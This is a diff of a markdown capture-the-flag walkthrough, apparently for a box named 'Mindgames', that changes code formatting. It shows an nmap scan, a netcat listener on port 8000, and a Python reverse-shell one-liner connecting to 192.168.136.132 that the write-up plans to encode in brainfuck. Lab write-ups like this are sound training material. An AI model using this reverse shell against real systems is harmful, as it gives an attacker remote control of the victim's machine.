@@ -34,17 +34,12 @@ PORT   STATE SERVICE
 **nmap -sC -sS -A --version-intensity 5 -v5 -T5 10.113.187.44 -p 22,80 -oN advancedNmap.txt --open --reason**
 
 
+`
 80/tcp open  http    syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-
-
 |_http-title: Mindgames.
-
-
 | http-methods: 
-
-
 |_  Supported Methods: GET HEAD POST OPTIONS
-
+`
 
 + we get information about both SSH and HTTP but http strikes me as interesting
 
@@ -87,7 +82,7 @@ nc -nlvp 8000
 + grab the following reverse shell from revshells.com
 
   
-**import os,pty,socket;s=socket.socket();s.connect(("192.168.136.132",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")**
+`import os,pty,socket;s=socket.socket();s.connect(("192.168.136.132",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`
 
 
 + use dcode to encode it into brainfuck
